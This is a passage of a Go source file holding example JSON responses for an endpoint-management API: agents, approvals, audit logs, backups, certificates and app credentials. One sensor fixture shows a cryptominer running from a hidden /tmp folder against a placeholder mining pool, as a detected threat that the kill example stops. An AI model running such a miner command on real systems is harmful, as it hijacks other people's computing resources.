		"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
		"hostname": "web-01",
		"opened_by": "rpatel",
		"opened_at": "2026-10-20T09:13:05Z",
		"closed_at": "2026-10-20T09:21:12Z",
		"expires_at": "2026-10-20T09:42:40Z",
		"reason": "Collect the nginx error log for INC-2041",
		"grant_id": "jg-7c1e5a9f3b2d48e6a0c4b8d2f6e1a3c5",
		"approved_by": "jdoe",
		"command_count": 3`
)

// respExamples are success responses, one per route, keyed like
// routeDocs. The spec gives each as the example of its route's JSON
// success response, so a reader sees real values: IDs in the form mustra
// mints, enum strings, how nested lists look. Each is written from its
// handler and type, never taken from a live server, and holds no secret.
// A test holds each to its route: it decodes into the declared Resp, the
// schema admits it, and it is what encoding/json would write. A list
// shows one or two entries; a route that answers in several shapes shows
// its main one, Resp.
var respExamples = map[string]string{
	// about
	"GET /api/about": `{
		"server": {"version": "0.93.0", "commit": "6a51892e0c4d7b1f93a2e85c6d0f4b7a1e3c9d25", "short_sha": "6a51892e0c4d", "build_time": "2026-10-20T16:42:08Z", "go_version": "go1.27.2", "platform": "linux/amd64"},
		"started_at": "2026-10-20T17:03:55Z",
		"agent_versions": [{"version": "0.57.41", "count": 37}, {"version": "0.57.40", "count": 5}],
		"changelog": "# Changelog\n\nWhat has actually shipped, newest first. …",
		"update_repo": "mustra-dev/mustra"
	}`,

	// access
	"GET /api/access/me": `{
		"action_group_endpoints": {"deploy": 12},
		"content_sets": ["cs-3b7f1d5a9c2e48e6b0a4d8c2f6e1b3a5"],
		"content_unrestricted": false,
		"endpoints": 1,
		"hostnames": ["FIN-LT-0142"],
		"total_endpoints": 42,
		"unrestricted": false
	}`,

	// action-groups
	// The deploy ceiling is the Web servers group, so deployments reach
	// its 12 endpoints at most; the shell ceiling is off, so it resolves
	// to nothing and the shell reaches the whole fleet.
	"GET /api/action-groups": `{
		"action_groups": [
			{"module": "deploy", "group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"], "enabled": true, "updated_by": "jdoe", "updated_at": "2026-09-02T13:40:18Z"},
			{"module": "shell", "group_ids": ["cgrp-6ea76dc9c2fb40e65159fc3cbda2a266"], "enabled": false, "updated_by": "jdoe", "updated_at": "2026-09-02T13:44:51Z"}
		],
		"modules": ["deploy", "patches", "playbooks", "shell", "enforce", "reveal"],
		"resolved": {"deploy": 12},
		"total_endpoints": 42
	}`,
	// The ceiling as saved, with the time the database stamped.
	"POST /api/action-groups": `{
		"module": "deploy",
		"group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"],
		"enabled": true,
		"updated_by": "jdoe",
		"updated_at": "2026-09-02T13:40:18Z"
	}`,

	// agent-identities
	// Both endpoints enrolled with a token, so neither needs re-enrolling
	// (the agent trust settings count none).
	"GET /api/agent-identities": `{
		"agents": [
			{"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9", "hostname": "FIN-LT-0142", "enrolled": true, "enrolled_via": "token", "enrolled_at": "2026-05-19T07:58:36Z", "last_auth_at": "2026-10-20T08:12:47Z"},
			{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "enrolled": true, "enrolled_via": "token", "enrolled_at": "2026-03-02T14:05:08Z", "last_auth_at": "2026-10-20T08:03:19Z"}
		],
		"identity_enforced": true,
		"legacy_allowed": false
	}`,

	// agent-trust
	"GET /api/agent-trust": agentTrustExample,
	"PUT /api/agent-trust": agentTrustExample,

	// agent-versions
	"GET /api/agent-versions": `{
		"changes": [
			{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "version": "0.57.41", "first_seen": "2026-10-18T22:14:37Z", "hostname": "web-01"},
			{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "version": "0.57.40", "first_seen": "2026-10-02T21:03:12Z", "hostname": "web-01"}
		]
	}`,

	// agents
	"GET /api/agents":                  `{"agents": [` + agentWeb01Example + `, ` + agentLaptopExample + `], "serving_version": "0.57.41"}`,
	"POST /api/agents/update-outdated": agentUpdateExample,
	"GET /api/agents/{id}/actions": `{
		"actions": [
			{
				"id": "act-8c2e6a0f4b1d47e9a3c5f7b9d1e0a2c4",
				"run_id": "run-5d1f9b3e7a2c46e8b0d4f6a8c2e1b3d5",
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"kind": "software_install",
				"summary": "jq",
				"status": "succeeded",
				"detail": "All required actions and validation completed",
				"requested_by": "jdoe",
				"started_at": "2026-10-19T13:02:44Z",
				"finished_at": "2026-10-19T13:03:21Z"
			}
		]
	}`,
	"POST /api/agents/{id}/apply-patches": `{"message": "patch job started — check back in a few minutes", "ok": true, "run_id": "run-6b2f8d4a0c1e47e9a5c3b7d1f9e2a4c8"}`,
	"GET /api/agents/{id}/attributes": `{
		"attributes": [
			{
				"id": "attr-5e9c1a7d3b2f46e8a0c4d6b8f2e1a3c7",
				"name": "cost_centre",
				"label": "Cost centre",
				"kind": "select",
				"options": ["Engineering", "Finance", "Sales"],
				"description": "Which budget pays for the endpoint",
				"created_by": "jdoe",
				"created_at": "2026-05-04T09:15:00Z",
				"updated_at": "2026-05-04T09:15:00Z"
			},
			{
				"id": "attr-3a7c9e1b5d2f48a6c0e4b8d2f6a1c9e3",
				"name": "owner",
				"label": "Owner",
				"kind": "text",
				"options": [],
				"description": "Who to ask before changing the endpoint",
				"created_by": "jdoe",
				"created_at": "2026-05-04T09:12:31Z",
				"updated_at": "2026-05-04T09:12:31Z"
			}
		],
		"values": {
			"attr-3a7c9e1b5d2f48a6c0e4b8d2f6a1c9e3": "jdoe@example.com",
			"attr-5e9c1a7d3b2f46e8a0c4d6b8f2e1a3c7": "Finance"
		}
	}`,
	// The values the body example sets, read back.
	"PUT /api/agents/{id}/attributes": `{
		"values": {
			"attr-3a7c9e1b5d2f48a6c0e4b8d2f6a1c9e3": "jdoe@example.com",
			"attr-5e9c1a7d3b2f46e8a0c4d6b8f2e1a3c7": "Finance"
		}
	}`,
	"POST /api/agents/{id}/intune/{action}": `{"message": "Intune accepted sync for FIN-LT-0142", "ok": true}`,
	"POST /api/agents/{id}/kill-process":    `{"message": "killed xmrig (pid 48213) on linux", "ok": true, "run_id": "run-1f5b9d3e7a2c48e6b0a4c8d2f6e1a3b5"}`,
	"POST /api/agents/{id}/managed":         `{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "managed": false}`,
	// The agent had one live connection, closed at once.
	"POST /api/agents/{id}/revoke-credential": `{"ok": true, "disconnected": 1}`,
	"POST /api/agents/{id}/sensor-interval":   `{"ok": true}`,
	// web-01's last processes snapshot, with the miner the kill example
	// stops. The data is the sensor's own shape; collected_at keeps
	// milliseconds.
	"GET /api/agents/{id}/sensor/{kind}": `{
		"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
		"sensor": "processes",
		"collected_at": "2026-10-20T08:40:12.418Z",
		"data": [
			{"pid": 1184, "name": "nginx", "ppid": 1, "username": "root", "cmdline": "nginx: master process /usr/sbin/nginx -g daemon on; master_process on;", "cpu_percent": 0.1, "mem_percent": 0.2, "mem_rss_mb": 14},
			{"pid": 48213, "name": "xmrig", "ppid": 48190, "username": "www-data", "cmdline": "/tmp/.x/xmrig -o pool.example.net:3333 --donate-level 1", "cpu_percent": 389.6, "mem_percent": 31.4, "mem_rss_mb": 2496}
		]
	}`,
	"POST /api/agents/{id}/update": agentUpdateExample,
	"GET /api/agents/{id}/versions": `{
		"history": [
			{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "version": "0.57.41", "first_seen": "2026-10-18T22:14:37Z"},
			{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "version": "0.57.40", "first_seen": "2026-10-02T21:03:12Z"}
		]
	}`,

	// approval-policies: the first enabled policy that covers an
	// operation holds it, in name order. The body examples' policy waits
	// for 25 endpoints; the older one gates any deploy operation that
	// touches a web server, and holds the pending request below.
	"GET /api/approval-policies": `{
		"modules": ["deploy", "patches", "playbooks"],
		"policies": [
			{` + approvalPolicyLargeDeployFields + `, "updated_at": "2026-10-20T09:24:16Z"},
			{
				"id": "ap-1e5a9c3f7b2d48e6a0c4d8b2f6e1a3c9",
				"name": "Second pair of eyes for production installs",
				"module": "deploy",
				"group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"],
				"min_devices": 0,
				"enabled": true,
				"created_by": "jdoe",
				"created_at": "2026-08-11T14:02:37Z",
				"updated_at": "2026-08-11T14:02:37Z"
			}
		]
	}`,
	"POST /api/approval-policies":     `{` + approvalPolicyLargeDeployFields + `, "updated_at": "2026-10-20T09:24:16Z"}`,
	"PUT /api/approval-policies/{id}": `{` + approvalPolicyLargeDeployFields + `, "updated_at": "2026-10-20T09:31:50Z"}`,

	// approvals
	"GET /api/approvals": `{
		"can_decide": true,
		"me": "jdoe",
		"pending": 1,
		"requests": [
			{
				"id": "apr-6d0b4f8a2c1e47e3b9a5c7d1f3e9b0a2",
				"policy_id": "ap-1e5a9c3f7b2d48e6a0c4d8b2f6e1a3c9",
				"policy_name": "Second pair of eyes for production installs",
				"module": "deploy",
				"summary": "install jq on 12 endpoint(s)",
				"method": "POST",
				"path": "/api/deploy/run",
				"agent_ids": ["agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4"],
				"device_count": 12,
				"requested_by": "asmith",
				"requested_at": "2026-10-20T08:15:40Z",
				"expires_at": "2026-10-21T08:15:40Z",
				"state": "pending"
			}
		]
	}`,
	// jdoe approves asmith's request from the list, as the body example
	// does.
	"POST /api/approvals/{id}/decide": `{"id": "apr-6d0b4f8a2c1e47e3b9a5c7d1f3e9b0a2", "state": "approved"}`,

	// approve-info
	// ?kind=approval for the request above, opened by jdoe from its chat
	// message while it is still pending. The times are UTC, to the minute.
	"GET /api/approve-info": `{
		"kind": "approval",
		"id": "apr-6d0b4f8a2c1e47e3b9a5c7d1f3e9b0a2",
		"title": "asmith is asking for approval: install jq on 12 endpoint(s)",
		"facts": [
			["What", "install jq on 12 endpoint(s)"],
			["Module", "deploy"],
			["Endpoints", "12"],
			["Policy", "Second pair of eyes for production installs"],
			["Requested", "2026-10-20 08:15 UTC"],
			["Expires", "2026-10-21 08:15 UTC"]
		],
		"state": "pending",
		"pending": true,
		"can_deny": true,
		"requested_by": "asmith",
		"decide_url": "/api/approvals/apr-6d0b4f8a2c1e47e3b9a5c7d1f3e9b0a2/decide",
		"approve_body": "{\"decision\":\"approve\"}",
		"deny_body": "{\"decision\":\"deny\"}",
		"console_link": "/access#approvals"
	}`,

	// assets
	// A number here, though the asset attributes list sends the same
	// setting as a string (#107).
	"POST /api/assets/purge-after": `{"purge_after_days": 90}`,

	// asset-attributes
	"GET /api/asset-attributes": `{
		"attributes": [
			` + costCentreAttributeRecord + `,
			{
				"id": "attr-3a7c9e1b5d2f48a6c0e4b8d2f6a1c9e3",
				"name": "owner",
				"label": "Owner",
				"kind": "text",
				"options": [],
				"description": "Who to ask before changing the endpoint",
				"created_by": "jdoe",
				"created_at": "2026-05-04T09:12:31Z",
				"updated_at": "2026-05-04T09:12:31Z"
			}
		],
		"kinds": ["text", "number", "date", "boolean", "select"],
		"purge_after_days": 365,
		"retired": 3,
		"set_count": {"cost_centre": 38, "owner": 41}
	}`,
	"POST /api/asset-attributes": costCentreAttributeRecord,
	// owner exists already, so the preset creates the other five.
	"POST /api/asset-attributes/lifecycle-preset": `{"created": ["purchase_date", "warranty_end", "lifecycle_state", "location", "cost"]}`,
	"PUT /api/asset-attributes/{id}":              `{` + costCentreAttributeFields + `, "updated_at": "2026-10-20T09:22:37Z"}`,

	// audit
	"GET /api/audit": `{
		"action_counts": {"agent.update": 2, "asset_attribute.set": 6, "live_response.kill": 1, "software.install": 4, "tokens.create": 1},
		"events": [
			{
				"id": 48213,
				"at": "2026-10-20T08:02:17Z",
				"action": "agent.update",
				"actor": "jdoe",
				"target": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"outcome": "ok",
				"severity": "notice",
				"detail": "{\"asked\":1,\"downgrade\":false,\"started\":1,\"to\":\"0.57.41\"}"
			},
			{
				"id": 48207,
				"at": "2026-10-20T07:58:14Z",
				"action": "asset_attribute.set",
				"actor": "jdoe",
				"target": "web-01",
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"outcome": "ok",
				"severity": "info",
				"detail": "{\"fields\":2}"
			}
		],
		"forwarding": {"enabled": true, "format": "rfc5424", "target": "siem.corp.example.com:514"},
		"log_level": "info"
	}`,

	// backups: the archives in the backup directory, newest first, read
	// from their manifests. A backup ID is bk and 32 hex digits, with no
	// dash.
	"GET /api/backups": `{
		"backups": [` + backupManualRecordExample + `, ` + backupNightlyRecordExample + `],
		"excluded": [
			"MUSTRA_CREDENTIAL_ENCRYPTION_KEY, which lives in deploy/.env. Stored credentials are encrypted with it: restore onto a deployment with a different key and those rows cannot be decrypted.",
			"The NATS certificates in deploy/nats/certs/, also on the host."
		],
		"settings": ` + backupSettingsExample + `
	}`,
	"POST /api/backups": backupManualRecordExample,
	// ?confirm=replace-everything&id= last night's backup, which this
	// server signed. The answer comes before the server restarts onto the
	// restored database.
	"POST /api/backups/restore": `{
		"manifest": {` + backupNightlyManifestFields + `},
		"package_files_restored": 0,
		"restarting_now": true
	}`,
	// The settings as sent: the handler answers with its body.
	"PUT /api/backups/settings": backupSettingsExample,
	"DELETE /api/backups/{id}":  `{"deleted": "bk-8750ae8d161a7bf707095e366812c2da"}`,

	// branding
	// The URL the new logo is served at. Its version is 1 for the logo
	// loaded at startup and moves with each upload, so a cached logo is
	// never shown in its place.
	"POST /api/admin/branding": `{"logo_url": "/branding/logo?v=2"}`,

	// cert-authorities
	// The managed certificates again, with the CAs' accounts as saved:
	// here AD CS, submitted through the domain-joined Windows laptop.
	"POST /api/admin/cert-authorities": `{
		"acme_email": "pki@example.com",
		"acme_staging": false,
		"adcs_agent": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
		"adcs_config": "ca01.corp.example.com\\Corp Issuing CA",
		"adcs_template": "WebServer",
		"cas": ` + certCAsExample + `,
		"cloudflare_token_set": false,
		"managed": [` + wwwManagedCertExample + `, ` + portalManagedCertExample + `],
		"private_ca_ready": true
	}`,

	// containers
	"GET /api/containers": `{
		"containers": [
			{
				"id": "4f1d2c8a9b3e",
				"name": "db",
				"image": "postgres:16.4",
				"image_digest": "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
				"state": "running",
				"status": "Up 3 days",
				"compose_project": "billing",
				"compose_service": "db",
				"compose_file": "/srv/billing/compose.yml",
				"update": "update_available",
				"update_detail": "A newer version tag exists.",
				"latest_digest": "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
				"newer_tag": "17.2",
				"newer_tag_in_major": "16.6",
				"checked_at": "2026-11-05T22:10:00Z",
				"agent_id": "agent-7f3a",
				"hostname": "docker-01",
				"online": true,
				"collected_at": "2026-11-06T08:15:00Z"
			}
		],
		"counts": {"update_available": 1},
		"hosts": 1
	}`,

	// backup-status
	// web-01 is a VM on the Proxmox node pve-01, matched to its endpoint
	// by MAC; the container no backup job covers is listed first. The
	// node's latest backup task is reported on each of its guests, the
	// uncovered one included. age_hours is counted when the list is read.
	// The connected Proxmox Backup Server also lists web-01 (in_proxmox:
	// the guest row above alerts for it) and a host backed up with the PBS
	// client, which no Proxmox node knows about.
	"GET /api/backup-status": `{
		"counts": {"not_covered": 1, "ok": 1},
		"guests": [
			{
				"vmid": 117,
				"name": "scratch-01",
				"type": "lxc",
				"status": "stopped",
				"node": "pve-01",
				"macs": ["bc:24:11:a3:07:5c"],
				"covered": false,
				"backups": 0,
				"last_job_status": "OK",
				"last_job_end": "2026-10-19T21:47:03Z",
				"host_agent_id": "agt-2d6b0f4a8c1e47d3b5a9c7e1f3d0b8a6",
				"state": "not_covered",
				"collected_at": "2026-10-20T08:30:41Z"
			},
			{
				"vmid": 101,
				"name": "web-01",
				"type": "qemu",
				"status": "running",
				"node": "pve-01",
				"macs": ["bc:24:11:5e:3a:91"],
				"covered": true,
				"jobs": ["backup-f4f5"],
				"last_backup": "2026-10-19T21:30:12Z",
				"last_storage": "pbs-main",
				"last_size_bytes": 4831838208,
				"last_verified": "ok",
				"backups": 14,
				"storages": ["pbs-main"],
				"last_job_status": "OK",
				"last_job_end": "2026-10-19T21:47:03Z",
				"host_agent_id": "agt-2d6b0f4a8c1e47d3b5a9c7e1f3d0b8a6",
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"age_hours": 11.246666666666666,
				"state": "ok",
				"collected_at": "2026-10-20T08:30:41Z"
			}
		],
		"stale_hours": 36,
		"systems": [` + backupSystemExample + `]
	}`,

	// threats: Plex Media Server, added to CISA KEV on 20 October and
	// installed on one endpoint whose version nothing checked; a written
	// briefing for PHP2Shell confirmed on two.
	"GET /api/threats":         `{"briefings": [` + threatPHPBriefExample + `, ` + threatPlexBriefExample + `], "window_days": 30, "kev_fetched_at": "2026-10-20T06:00:12Z", "editable": true}`,
	"GET /api/threats/{id}":    threatPlexDetailExample,
	"POST /api/threats":        threatBriefExample,
	"PUT /api/threats/{id}":    threatBriefExample,
	"DELETE /api/threats/{id}": `{"deleted": "tb-7e3a9c1f5b2d48e6a0c4b8d2f6e1a3c5"}`,
	"GET /api/threat-settings": threatSettingsExample,
	"PUT /api/threat-settings": threatSettingsExample,

	// telemetry: every endpoint at 15 s, pushed to an in-house Prometheus;
	// two endpoints reported in the last minute.
	"GET /api/telemetry":       telemetryExample,
	"PUT /api/telemetry":       telemetryExample,
	"POST /api/telemetry/test": `{"ok": true, "message": "accepted: query mustra_telemetry_test in Prometheus"}`,

	// backup-sources: a PBS server pinned by its certificate fingerprint;
	// the secret is never returned, only that one is stored.
	"GET /api/backup-sources":            `{"sources": [` + backupSourceExample + `], "kinds": {"pbs": "Proxmox Backup Server", "rubrik": "Rubrik Security Cloud"}}`,
	"POST /api/backup-sources":           backupSourceExample,
	"PUT /api/backup-sources/{id}":       backupSourceExample,
	"POST /api/backup-sources/{id}/poll": backupSourceExample,
	"DELETE /api/backup-sources/{id}":    `{"deleted": "bks-5d2e8a1c9f3b47e6a0d4c8b2f6e1a3d9"}`,

	// catalog
	// Newest first. requested_by is the account signed in to the
	// endpoint, which Self Service reports; decided_at stays null until
	// somebody decides.
	"GET /api/catalog/requests": `[
		{
			"id": "creq-6f0b4d8a2c1e47e9b3a5d7c9f1e3a5b8",
			"item_id": "sw-2e8a4c0f6b1d49e3a7c5b9d1f3e0a2c4",
			"item_name": "Visual Studio Code",
			"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
			"hostname": "FIN-LT-0142",
			"requested_by": "mlopez",
			"reason": "Editing the month-end reconciliation scripts",
			"status": "pending",
			"requested_at": "2026-10-20T08:02:47Z",
			"decided_at": null,
			"decided_by": ""
		},
		{
			"id": "creq-1a5c9e3f7b2d48e6a0c4b8d2f6e1a3c7",
			"item_id": "sw-2e8a4c0f6b1d49e3a7c5b9d1f3e0a2c4",
			"item_name": "Visual Studio Code",
			"agent_id": "agt-5c9e3a7f1b2d48e6a0c4d8b2f6e1a3c7",
			"hostname": "HR-LT-0031",
			"requested_by": "kchen",
			"reason": "",
			"status": "approved",
			"requested_at": "2026-10-14T09:26:15Z",
			"decided_at": "2026-10-14T09:58:02Z",
			"decided_by": "jdoe"
		}
	]`,
	"POST /api/catalog/requests/{id}/decide": `{"status": "approved"}`,

	// certificates
	// The whole inventory: the counts are taken from these rows. web-01
	// and FIN-LT-0142 are the endpoints reporting (see the coverage).
	"GET /api/certificates": `{
		"certificates": [
			{
				"fingerprint": "fc2b6db533cb746aa989dc79d04602efaea202aec4f5a6d51e3e3f5e3fe3cb96",
				"subject": "legacy-api.corp.example.com",
				"issuer": "legacy-api.corp.example.com",
				"dns_names": ["legacy-api.corp.example.com"],
				"not_before": "2024-10-26T06:00:00Z",
				"not_after": "2026-10-26T06:00:00Z",
				"days_left": 5,
				"status": "critical",
				"is_ca": false,
				"self_signed": true,
				"trust_store": false,
				"key_algorithm": "RSA",
				"sig_algorithm": "SHA256-RSA",
				"deployments": 1
			},
			{` + wwwCertificateRowFields + `},
			{
				"fingerprint": "96bcec06264976f37460779acf28c5a7cfe8a3c0aae11a8ffcee05c0bddf08c6",
				"subject": "ISRG Root X1",
				"issuer": "ISRG Root X1",
				"dns_names": ["ISRG Root X1"],
				"not_before": "2015-06-04T11:04:38Z",
				"not_after": "2035-06-04T11:04:38Z",
				"days_left": 3149,
				"status": "ok",
				"is_ca": true,
				"self_signed": true,
				"trust_store": true,
				"key_algorithm": "RSA",
				"sig_algorithm": "SHA256-RSA",
				"deployments": 2
			}
		],
		"counts": {"critical": 1, "expired": 0, "notice": 0, "ok": 1, "warning": 0},
		"expiring_cas": 0,
		"generated_at": "2026-10-20T08:40:00Z",
		"reporting": 2,
		"service_certs": 2,
		"thresholds": {"critical": 7, "notice": 90, "warning": 30},
		"total": 3,
		"trust_store": 1
	}`,
	// Each item names what it is in item_type, and extra carries what that
	// kind adds. A
	// recent alert's title is the item's name, as stored with the alert,
	// not the notification's title.
	"GET /api/certificates/alerts": `{
		"effective": [60, 30, 14, 7, 1, 0],
		"integrations": [
			{"name": "Ops channel", "kind": "Microsoft Teams", "enabled": true},
			{"name": "ServiceNow", "kind": "ServiceNow (incidents)", "enabled": true, "only_days": "60"}
		],
		"recent": [
			{
				"item_key": "fp:fc2b6db533cb746aa989dc79d04602efaea202aec4f5a6d51e3e3f5e3fe3cb96",
				"expires_at": "2026-10-26T06:00:00Z",
				"threshold": 7,
				"title": "legacy-api.corp.example.com",
				"days_left": 7,
				"sent_at": "2026-10-19T07:00:04Z"
			},
			{
				"item_key": "ac:acr-58c845d0e6213c55ac7c38440ec4b07f:3bfe8017-471c-443d-bf63-f74b6fb2d66c",
				"expires_at": "2026-12-05T13:44:51Z",
				"threshold": 60,
				"title": "Expense reports · Client secret",
				"days_left": 60,
				"sent_at": "2026-10-06T14:00:07Z"
			}
		],
		"sources": ["managed", "fleet", "apps"],
		"thresholds": "60,30,14,7,1",
		"upcoming": [
			{
				"key": "fp:fc2b6db533cb746aa989dc79d04602efaea202aec4f5a6d51e3e3f5e3fe3cb96",
				"item_type": "certificate",
				"name": "legacy-api.corp.example.com",
				"where": "web-01",
				"expires_at": "2026-10-26T06:00:00Z",
				"link": "/certificates#overview",
				"extra": {"dns_names": ["legacy-api.corp.example.com"], "fingerprint": "fc2b6db533cb746aa989dc79d04602efaea202aec4f5a6d51e3e3f5e3fe3cb96", "issuer": "legacy-api.corp.example.com", "self_signed": true},
				"days_left": 6
			},
			{
				"key": "ac:acr-58c845d0e6213c55ac7c38440ec4b07f:3bfe8017-471c-443d-bf63-f74b6fb2d66c",
				"item_type": "app_credential",
				"name": "Expense reports · Client secret",
				"where": "Microsoft Entra ID",
				"expires_at": "2026-12-05T13:44:51Z",
				"link": "/certificates#apps",
				"extra": {"credential_type": "client_secret", "mode": "download", "provider": "Microsoft Entra ID"},
				"days_left": 47
			},
			{
				"key": "mc:mc-609abf253e18b8bf13685449474e7170",
				"item_type": "managed_certificate",
				"name": "www.example.com",
				"where": "web-01 /etc/nginx/ssl/www.example.com.crt",
				"expires_at": "2027-02-13T09:31:11Z",
				"link": "/certificates#renewal",
				"extra": {"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "authority": "Mustra Private CA", "renews_automatically": true},
				"days_left": 117
			}
		]
	}`,
	// No source ticked is saved as off.
	"POST /api/certificates/alerts":      `{"sources": ["managed", "fleet"], "thresholds": "60,30,14,7"}`,
	"POST /api/certificates/alerts/test": `{"ok": true}`,
	"GET /api/certificates/apps": `{
		"connections": [
			{
				"id": "acc-c005e4174905374fb5116696fb1a4541",
				"kind": "entra",
				"name": "Entra ID production",
				"config": {"client_id": "5b9e2c7a-1d4f-4a8e-b6c3-0f7d2e9a1b5c", "tenant_id": "8d3f1a6e-4b2c-4e7a-9f05-c1d8e2b7a4f3"},
				"has_secret": true,
				"last_ok_at": "2026-10-20T08:00:03Z",
				"last_error": "",
				"created_by": "jdoe",
				"created_at": "2026-06-02T13:40:18Z"
			}
		],
		"credentials": [
			{
				"id": "acr-58c845d0e6213c55ac7c38440ec4b07f",
				"connection_id": "acc-c005e4174905374fb5116696fb1a4541",
				"kind": "entra",
				"app_id": "95b7c041-e2e7-46ee-a02c-a91d01e998b5",
				"app_name": "Expense reports",
				"cred_type": "client_secret",
				"external_id": "3bfe8017-471c-443d-bf63-f74b6fb2d66c",
				"display_name": "production",
				"expires_at": "2026-12-05T13:44:51Z",
				"rotate_days": 0,
				"renew_days": 30,
				"mode": "download",
				"push_agent_id": "",
				"push_path": "",
				"push_key": "",
				"push_reload": "",
				"grace_days": 7,
				"state": "idle",
				"last_detail": "",
				"created_by": "jdoe",
				"created_at": "2026-06-02T13:52:06Z",
				"due_at": "2026-11-05T13:44:51Z",
				"rotatable": true,
				"material_available": false,
				"kind_label": "Microsoft Entra ID",
				"type_label": "Client secret"
			},
			{
				"id": "acr-c685e24264469e03257ffda4dca26012",
				"connection_id": "",
				"kind": "manual",
				"app_id": "",
				"app_name": "Payroll SSO",
				"cred_type": "client_secret",
				"external_id": "",
				"display_name": "Client secret of the Payroll app registration",
				"expires_at": "2027-03-31T00:00:00Z",
				"rotate_days": 0,
				"renew_days": 30,
				"mode": "remind",
				"push_agent_id": "",
				"push_path": "",
				"push_key": "",
				"push_reload": "",
				"grace_days": 0,
				"state": "idle",
				"last_detail": "",
				"created_by": "jdoe",
				"created_at": "2026-10-20T08:21:37Z",
				"due_at": "2027-03-01T00:00:00Z",
				"rotatable": false,
				"material_available": false,
				"kind_label": "Entered by hand",
				"type_label": "Client secret"
			}
		],
		"kinds": {"authentik": "Authentik", "entra": "Microsoft Entra ID", "gcp": "Google Cloud", "manual": "Entered by hand", "okta": "Okta"},
		"types": {"certificate": "Certificate", "client_certificate": "Client certificate", "client_secret": "Client secret", "saml_signing": "SAML signing certificate", "service_account_key": "Service-account key"}
	}`,
	// The connection is tested as soon as it is saved: test_error is
	// what the provider said, or empty when the secret works.
	"POST /api/certificates/apps/connections":     `{"id": "acc-c005e4174905374fb5116696fb1a4541", "test_error": ""}`,
	"PUT /api/certificates/apps/connections/{id}": `{"id": "acc-c005e4174905374fb5116696fb1a4541", "test_error": ""}`,
	// What the provider holds, not yet saved: no ID or settings of their
	// own, and imported says which are tracked already.
	"GET /api/certificates/apps/connections/{id}/discover": `{
		"found": [
			{
				"id": "",
				"connection_id": "acc-c005e4174905374fb5116696fb1a4541",
				"kind": "entra",
				"app_id": "95b7c041-e2e7-46ee-a02c-a91d01e998b5",
				"app_name": "Expense reports",
				"cred_type": "client_secret",
				"external_id": "3bfe8017-471c-443d-bf63-f74b6fb2d66c",
				"display_name": "production",
				"expires_at": "2026-12-05T13:44:51Z",
				"rotate_days": 0,
				"renew_days": 0,
				"mode": "",
				"push_agent_id": "",
				"push_path": "",
				"push_key": "",
				"push_reload": "",
				"grace_days": 0,
				"state": "",
				"last_detail": "",
				"created_by": "",
				"created_at": "0001-01-01T00:00:00Z",
				"imported": true,
				"type_label": "Client secret"
			},
			{
				"id": "",
				"connection_id": "acc-c005e4174905374fb5116696fb1a4541",
				"kind": "entra",
				"app_id": "95b7c041-e2e7-46ee-a02c-a91d01e998b5",
				"app_name": "Expense reports",
				"cred_type": "client_certificate",
				"external_id": "84616364-2386-4464-bf5b-5dee7bde2f35",
				"display_name": "CN=expense-reports",
				"expires_at": "2027-01-22T00:00:00Z",
				"rotate_days": 0,
				"renew_days": 0,
				"mode": "",
				"push_agent_id": "",
				"push_path": "",
				"push_key": "",
				"push_reload": "",
				"grace_days": 0,
				"state": "",
				"last_detail": "",
				"created_by": "",
				"created_at": "0001-01-01T00:00:00Z",
				"imported": false,
				"type_label": "Client certificate"
			}
		]
	}`,
	// The credential as stored: a new one is idle, stamped by the
	// database.
	"POST /api/certificates/apps/credentials": `{
		"id": "acr-c685e24264469e03257ffda4dca26012",
		"connection_id": "",
		"kind": "manual",
		"app_id": "",
		"app_name": "Payroll SSO",
		"cred_type": "client_secret",
		"external_id": "",
		"display_name": "Client secret of the Payroll app registration",
		"expires_at": "2027-03-31T00:00:00Z",
		"rotate_days": 0,
		"renew_days": 30,
		"mode": "remind",
		"push_agent_id": "",
		"push_path": "",
		"push_key": "",
		"push_reload": "",
		"grace_days": 0,
		"state": "idle",
		"last_detail": "",
		"created_by": "jdoe",
		"created_at": "2026-10-20T09:12:05Z"
	}`,
	// The credential as stored after the change, its creator, state and
	// history kept.
	"PUT /api/certificates/apps/credentials/{id}": `{
		"id": "acr-c685e24264469e03257ffda4dca26012",
		"connection_id": "",
		"kind": "manual",
		"app_id": "",
		"app_name": "Payroll SSO",
		"cred_type": "client_secret",
		"external_id": "",
		"display_name": "Client secret of the Payroll app registration",
		"expires_at": "2027-03-31T00:00:00Z",
		"rotate_days": 0,
		"renew_days": 30,
		"mode": "remind",
		"push_agent_id": "",
		"push_path": "",
		"push_key": "",
		"push_reload": "",
		"grace_days": 7,
		"state": "idle",
		"last_detail": "",
		"created_by": "jdoe",
		"created_at": "2026-10-20T09:12:05Z"
	}`,
	// Renewed at Entra: the old secret stays valid for the grace days,
	// and the new one can be downloaded until then.
	"POST /api/certificates/apps/credentials/{id}/renew": `{
		"id": "acr-58c845d0e6213c55ac7c38440ec4b07f",
